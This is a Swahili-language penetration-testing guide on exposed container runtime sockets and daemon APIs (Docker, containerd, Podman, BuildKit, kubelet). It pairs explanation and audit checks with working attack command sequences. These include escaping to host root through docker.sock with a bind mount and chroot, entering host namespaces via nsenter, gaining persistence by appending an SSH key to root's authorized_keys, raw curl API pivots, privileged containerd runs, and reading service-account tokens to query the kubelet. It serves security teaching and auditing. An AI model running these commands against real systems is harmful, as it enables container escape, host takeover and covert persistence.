# Uwazi wa Runtime API na Daemon

## Muhtasari

Compromise nyingi halisi za containers hazianzi na namespace escape kabisa. Huanzia kwenye ufikiaji wa runtime control plane. Ikiwa workload inaweza kuwasiliana na `dockerd`, `containerd`, CRI-O, Podman, au kubelet kupitia Unix socket iliyowekwa ndani ya container au TCP listener iliyo wazi, attacker anaweza kuweza kuomba container mpya yenye privileges bora zaidi, ku-mount filesystem ya host, kujiunga na host namespaces, au kupata taarifa nyeti za node. Katika hali hizi, runtime API ndiyo security boundary halisi, na ku-compromise ni karibu sawa na ku-compromise host.

Hii ndiyo sababu uwazi wa runtime socket unapaswa kurekodiwa kando na ulinzi wa kernel. Container yenye seccomp, capabilities, na MAC confinement za kawaida bado inaweza kuwa API call moja tu kutoka kwa host compromise ikiwa `/var/run/docker.sock` au `/run/containerd/containerd.sock` imewekwa ndani yake. Kernel isolation ya container ya sasa inaweza kuwa inafanya kazi ipasavyo, huku runtime management plane ikiwa wazi kikamilifu.

## Miundo ya Ufikiaji wa Daemon

Docker Engine kwa kawaida huweka privileged API yake wazi kupitia Unix socket ya ndani kwenye `unix:///var/run/docker.sock`. Kihistoria, pia imekuwa ikiwekwa wazi kwa mbali kupitia TCP listeners kama `tcp://0.0.0.0:2375` au listener yenye ulinzi wa TLS kwenye `2376`. Kuweka daemon wazi kwa mbali bila TLS thabiti na client authentication kwa ufanisi hugeuza Docker API kuwa remote root interface.

containerd, CRI-O, Podman, na kubelet huweka wazi attack surfaces zenye athari kubwa zinazofanana. Majina na workflows hutofautiana, lakini mantiki haibadiliki. Ikiwa interface inamruhusu caller kuunda workloads, ku-mount host paths, kupata credentials, au kubadilisha containers zinazoendesha, interface hiyo ni privileged management channel na inapaswa kushughulikiwa ipasavyo.

Common local paths zinazofaa kuangaliwa ni:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Stack za zamani au maalum zaidi zinaweza pia kufichua endpoints kama `dockershim.sock`, `frakti.sock`, au `rktlet.sock`. Hizi si za kawaida sana katika mazingira ya kisasa, lakini zinapopatikana zinapaswa kushughulikiwa kwa tahadhari hiyo hiyo kwa sababu zinawakilisha sehemu za udhibiti wa runtime badala ya sockets za kawaida za application.

## Ufikiaji wa Mbali Salama

Ikiwa daemon lazima ifichuliwe nje ya socket ya ndani, muunganisho unapaswa kulindwa kwa TLS na ikiwezekana utumie mutual authentication ili daemon imthibitishe client na client imthibitishe daemon. Tabia ya zamani ya kufungua Docker daemon kupitia HTTP isiyo na ulinzi kwa ajili ya urahisi ni mojawapo ya makosa hatari zaidi katika usimamizi wa containers kwa sababu API surface ina uwezo wa kutosha kuunda containers zenye privileges moja kwa moja.

Muundo wa kihistoria wa usanidi wa Docker ulionekana hivi:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Kwenye hosts zinazotumia systemd, mawasiliano ya daemon yanaweza pia kuonekana kama `fd://`, kumaanisha kwamba mchakato hurithi socket iliyofunguliwa awali kutoka systemd badala ya kuifungamanisha moja kwa moja. Somo muhimu si syntax halisi, bali athari ya kiusalama. Daemon inapoanza kusikiliza nje ya socket ya ndani yenye ruhusa zilizowekewa mipaka kwa ukali, usalama wa transport na authentication ya client huwa lazima, badala ya kuwa hardening ya hiari.

## Matumizi Mabaya

Ikiwa runtime socket ipo, thibitisha ni ipi, kama client inayooana ipo, na kama ufikiaji wa raw HTTP au gRPC unawezekana:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Amri hizi ni muhimu kwa sababu zinatofautisha kati ya njia isiyofanya kazi, socket iliyomountiwa lakini isiyoweza kufikiwa, na API hai yenye privileges. Ikiwa client itafaulu, swali linalofuata ni ikiwa API inaweza kuanzisha container mpya yenye host bind mount au kushiriki host namespace.

### Wakati Hakuna Client Iliyosakinishwa

Kutokuwepo kwa `docker`, `podman`, au CLI nyingine rahisi ya kutumia hakumaanishi kuwa socket iko salama. Docker Engine hutumia HTTP kupitia Unix socket yake, na Podman hutoa API inayooana na Docker pamoja na API ya asili ya Libpod kupitia `podman system service`. Hii inamaanisha kuwa mazingira madogo yenye `curl` pekee huenda bado yakatosha kuendesha daemon:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Hili ni muhimu wakati wa post-exploitation kwa sababu defenders wakati mwingine huondoa client binaries za kawaida lakini huacha management socket ikiwa mounted. Kwenye hosts za Podman, kumbuka kwamba path yenye thamani kubwa hutofautiana kati ya deployments za rootful na rootless: `unix:///run/podman/podman.sock` kwa service instances za rootful na `unix://$XDG_RUNTIME_DIR/podman/podman.sock` kwa za rootless.

### Mfano Kamili: Docker Socket Hadi Host Root

Ikiwa `docker.sock` inafikika, escape ya kawaida ni kuanzisha container mpya inayomount host root filesystem, kisha kuingia ndani yake kwa `chroot`:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Hii hutoa utekelezaji wa moja kwa moja wa host-root kupitia Docker daemon. Athari haiishii kwenye kusoma faili pekee. Baada ya kuingia kwenye container mpya, mshambuliaji anaweza kubadilisha mafaili ya host, kukusanya credentials, kuweka persistence, au kuanzisha workloads za ziada zenye privileged access.

### Mfano Kamili: Docker Socket Hadi Host Namespaces

Ikiwa mshambuliaji anapendelea namespace entry badala ya ufikiaji wa filesystem pekee:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Njia hii hufikia host kwa kuomba runtime itengeneze container mpya yenye host-namespace exposure iliyoainishwa wazi, badala ya kutumia vibaya ile iliyopo.

### Muundo wa Persistence wa Docker Socket

Runtime control pia inaweza kutumiwa kwa persistence badala ya shell ya mara moja. Muundo wa jumla ni kutengeneza helper container yenye host mount, kuandika authorized access material au startup hook kwenye host filesystem iliyomountiwa, kisha kuthibitisha kuwa host inaitumia.

Mfano wa muundo:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
Wazo hilo hilo linaweza kulenga systemd units, cron fragments, application startup files, au SSH keys kulingana na kile operator anachotaka kuthibitisha. Jambo muhimu ni kwamba mabadiliko ya kudumu yanafanywa kupitia mamlaka ya runtime daemon kwenye filesystem ya host, si kupitia privilege ya ziada ndani ya container ya awali.

### Raw Docker API Helper Pivot

Docker CLI inapokosekana, helper flow hiyo hiyo ya host-mount inaweza kuendeshwa kupitia HTTP juu ya Unix socket. Mtiririko wa jumla ni: thibitisha API, tengeneza helper container yenye host bind mount, ianzishe, tengeneza exec instance, kisha uanzishe exec hiyo.
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
Ombi la mwisho la `/exec/<id>/start` linategemea exec ID iliyorejeshwa, lakini hoja ya usalama haitegemei jinsi JSON inavyoshughulikiwa: ufikiaji wa moja kwa moja wa API kwa Docker daemon ya rootful unatosha kuomba helper workload yenye nguvu zaidi.

### Mfano Kamili: containerd Socket

Socket ya `containerd` iliyowekwa mara nyingi huwa hatari vivyo hivyo:<sup>[[1]](#references)</sup>
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Ikiwa client inayofanana zaidi na Docker ipo, `nerdctl` inaweza kuwa rahisi zaidi kuliko `ctr` kwa sababu inatoa flags zinazozoeleka kama `--privileged`, `--pid=host`, na `-v`:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
Athari bado ni compromise ya host. Hata kama tooling maalum ya Docker haipo, runtime API nyingine bado inaweza kutoa uwezo huo huo wa kiutawala. Kwenye nodes za Kubernetes, `crictl` inaweza pia kutosha kwa reconnaissance na mwingiliano na containers kwa sababu inawasiliana moja kwa moja na CRI endpoint.

### BuildKit Socket

`buildkitd` ni rahisi kupuuzwa kwa sababu mara nyingi watu huiona kama "backend ya build tu", lakini daemon bado ni control plane yenye privileges. `buildkitd.sock` inayoweza kufikiwa inaweza kumruhusu mshambuliaji kuendesha build steps kiholela, kukagua uwezo wa worker, kutumia local contexts kutoka kwenye mazingira yaliyocompromise, na kuomba entitlements hatari kama `network.host` au `security.insecure` wakati daemon ilisanidiwa kuziruhusu.

Mwingiliano wa kwanza unaofaa ni:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Ikiwa daemon inakubali maombi ya build, jaribu kubaini kama entitlements zisizo salama zinapatikana:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
Athari kamili inategemea usanidi wa daemon, lakini huduma ya BuildKit ya rootful yenye entitlements zinazoruhusu mambo mengi si urahisi usio na madhara kwa developers. Ichukulie kama surface nyingine ya kiutawala yenye thamani kubwa, hasa kwenye CI runners na build nodes zinazoshirikiwa.

### Kubelet API Kupitia TCP

kubelet si container runtime, lakini bado ni sehemu ya control plane ya node na mara nyingi hujadiliwa ndani ya trust boundary hiyo hiyo. Ikiwa secure port ya kubelet `10250` inaweza kufikiwa kutoka kwenye workload, au ikiwa node credentials, kubeconfigs, au proxy rights zimefichuliwa, attacker anaweza kuorodhesha Pods, kupata logs, au kutekeleza commands kwenye containers za node-local bila hata kugusa njia ya Kubernetes API server admission.

Anza na discovery rahisi:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Ikiwa njia ya proxy ya kubelet au API-server inaruhusu `exec`, mteja anayeunga mkono WebSocket anaweza kubadilisha hilo kuwa code execution katika containers nyingine kwenye node. Hii pia ndiyo sababu `nodes/proxy` yenye ruhusa ya `get` pekee ni hatari zaidi kuliko inavyosikika: ombi bado linaweza kufikia endpoints za kubelet zinazotekeleza commands, na mawasiliano hayo ya moja kwa moja na kubelet hayaonekani katika Kubernetes audit logs za kawaida.<sup>[[2]](#references)</sup>

## Ukaguzi

Lengo la ukaguzi huu ni kujibu ikiwa container inaweza kufikia management plane yoyote ambayo ilipaswa kubaki nje ya trust boundary.
```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Kinachovutia hapa:

- Runtime socket iliyomountiwa kwa kawaida ni primitive ya moja kwa moja ya usimamizi badala ya kuwa ufichuaji wa taarifa tu.
- TCP listener kwenye `2375` bila TLS inapaswa kuchukuliwa kuwa hali ya remote compromise.
- Environment variables kama `DOCKER_HOST` mara nyingi hufichua kwamba workload iliundwa kimakusudi kuwasiliana na runtime ya host.

## Runtime Defaults

| Runtime / platform | Hali ya default | Tabia ya default | Udhoofishaji wa kawaida wa mikono |
| --- | --- | --- | --- |
| Docker Engine | Unix socket ya ndani kwa default | `dockerd` husikiliza kwenye socket ya ndani na daemon kwa kawaida huendeshwa kama root | kumount `/var/run/docker.sock`, kufichua `tcp://...:2375`, TLS dhaifu au usiokuwepo kwenye `2376` |
| Podman | CLI isiyo na daemon kwa default | Hakuna daemon ya privileged ya muda mrefu inayohitajika kwa matumizi ya kawaida ya ndani; API sockets bado zinaweza kufichuliwa wakati `podman system service` imewezeshwa | kufichua `podman.sock`, kuendesha service kwa upana, kutumia rootful API |
| containerd | Socket ya ndani ya privileged | Administrative API hufichuliwa kupitia socket ya ndani na kwa kawaida hutumiwa na tooling ya kiwango cha juu | kumount `containerd.sock`, kutoa ufikiaji mpana wa `ctr` au `nerdctl`, kufichua privileged namespaces |
| CRI-O | Socket ya ndani ya privileged | CRI endpoint imekusudiwa kwa components zinazoaminika za node-local | kumount `crio.sock`, kufichua CRI endpoint kwa workloads zisizoaminika |
| Kubernetes kubelet | Node-local management API | Kubelet haipaswi kufikika kwa upana kutoka kwa Pods; ufikiaji unaweza kufichua hali ya pod, credentials, na execution features kulingana na authn/authz | kumount kubelet sockets au certs, kubelet auth dhaifu, host networking pamoja na kubelet endpoint inayofikika |

## References

- [1] [containerd socket exploitation sehemu ya 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Hatari za Kubernetes API Server Bypass](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
